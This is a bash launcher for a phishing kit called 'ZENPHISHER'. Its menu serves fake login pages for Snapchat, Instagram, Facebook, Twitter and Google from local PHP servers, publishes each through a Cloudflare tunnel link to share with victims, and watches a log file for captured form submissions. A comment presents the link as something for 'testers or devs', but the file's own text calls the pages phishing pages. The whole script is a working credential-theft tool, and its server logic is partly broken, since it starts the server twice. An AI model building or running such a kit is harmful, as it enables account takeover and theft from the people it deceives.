#!/bin/bash

clear
echo -e "\e[1;32m===================================="
echo -e "      ZENPHISHER - by YOU 😈        "
echo -e "===================================="
echo -e "\n\e[1;34mChoose a target to deploy:"

echo -e "1) Snapchat \e[1;33m(crypto design)"
echo -e "2) Instagram \e[1;33m(crypto design)"
echo -e "3) Facebook \e[1;33m(crypto design)"
echo -e "4) Twitter \e[1;33m(crypto design)"
echo -e "5) Google \e[1;33m(crypto design)"
echo -e "6) Advanced Settings"
echo -e "7) Exit\n"

read -p "Option: " opt

# --- Get current timestamp, timezone, and IP geolocation ---
timestamp=$(date "+%Y-%m-%d %H:%M:%S")
timezone=$(date +'%Z%z')  # Get the local timezone of the machine
ip_address=$(curl -s ifconfig.me)  # Getting the public IP address
geolocation=$(curl -s "http://ip-api.com/json/$ip_address" | jq -r '"City: " + .city + ", Country: " + .country')  # Using ip-api to get geolocation

# --- Log the information to log.txt ---
log_file="log.txt"
echo -e "\n[Timestamp: $timestamp] - Target: $opt" >> $log_file
echo -e "IP Address: $ip_address" >> $log_file
echo -e "Geolocation: $geolocation" >> $log_file
echo -e "Timezone: $timezone" >> $log_file
echo -e "Device Info: $(uname -a)\n" >> $log_file

# --- Handle different user choices ---
case $opt in
  1)
    echo -e "\e[1;32mStarting Snapchat phishing page..."
    cd sites/Snapchat
    php -S 127.0.0.1:8080
     # Start PHP server in background
  php -S 127.0.0.1:8080 > /dev/null 2>&1 &

  sleep 2

  # Launch Cloudflare tunnel and capture public URL
  echo -e "\e[1;34mOpening Cloudflare tunnel..."
  TUNNEL_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')

  # Display the tunnel URL
  echo -e "\n\e[1;32mPublic Link:\e[0m $TUNNEL_URL"
  echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"

  echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"

  # Tail log file in real time
  tail -f ../../log.txt
    ;;
  2)
    echo -e "\e[1;32mStarting Instagram phishing page..."
    cd sites/Instagram
    php -S 127.0.0.1:8080
     php -S 127.0.0.1:8080 > /dev/null 2>&1 &

  sleep 2

  # Launch Cloudflare tunnel and capture public URL
  echo -e "\e[1;34mOpening Cloudflare tunnel..."
  TUNNEL_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')

  # Display the tunnel URL
  echo -e "\n\e[1;32mPublic Link:\e[0m $TUNNEL_URL"
  echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"

  echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"

  # Tail log file in real time
  tail -f ../../log.txt
    ;;
  3)
    echo -e "\e[1;32mStarting Facebook phishing page..."
    cd sites/Facebook
    php -S 127.0.0.1:8080
     php -S 127.0.0.1:8080 > /dev/null 2>&1 &

  sleep 2

  # Launch Cloudflare tunnel and capture public URL
  echo -e "\e[1;34mOpening Cloudflare tunnel..."
  TUNNEL_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')

  # Display the tunnel URL
  echo -e "\n\e[1;32mPublic Link:\e[0m $TUNNEL_URL"
  echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"

  echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"

  # Tail log file in real time
  tail -f ../../log.txt
    ;;
  4)
    echo -e "\e[1;32mStarting Twitter phishing page..."
    cd sites/Twitter
    php -S 127.0.0.1:8080
     php -S 127.0.0.1:8080 > /dev/null 2>&1 &

  sleep 2

  # Launch Cloudflare tunnel and capture public URL
  echo -e "\e[1;34mOpening Cloudflare tunnel..."
  TUNNEL_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')

  # Display the tunnel URL
  echo -e "\n\e[1;32mPublic Link:\e[0m $TUNNEL_URL"
  echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"

  echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"

  # Tail log file in real time
  tail -f ../../log.txt
    ;;
  5)
    echo -e "\e[1;32mStarting Google phishing page..."
    cd sites/Google
    php -S 127.0.0.1:8080
     php -S 127.0.0.1:8080 > /dev/null 2>&1 &

  sleep 2

  # Launch Cloudflare tunnel and capture public URL
  echo -e "\e[1;34mOpening Cloudflare tunnel..."
  TUNNEL_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')

  # Display the tunnel URL
  echo -e "\n\e[1;32mPublic Link:\e[0m $TUNNEL_URL"
  echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"

  echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"

  # Tail log file in real time
  tail -f ../../log.txt
    ;;
  6)
    echo -e "\n\e[1;33mAdvanced Settings:"
    # Advanced settings functionality
    ;;
  7)
    echo -e "\e[1;31mExiting...\e[0m"
    exit
    ;;
  *)
    echo -e "\e[1;31mInvalid Option! Please select a valid option.\e[0m"
    exec $0
    ;;
esac
